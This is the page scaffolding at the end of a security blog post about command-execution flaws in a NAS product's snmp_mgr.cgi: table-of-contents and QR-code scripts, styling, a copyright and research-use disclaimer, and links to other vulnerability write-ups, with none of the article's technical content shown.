numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS snmp\_mgr.cgi 多处命令执行漏洞](https://mrxn.net/jswz/west-nas-snmp_mgr-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-snmp_mgr-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-snmp\_mgr-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-snmp\_mgr-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 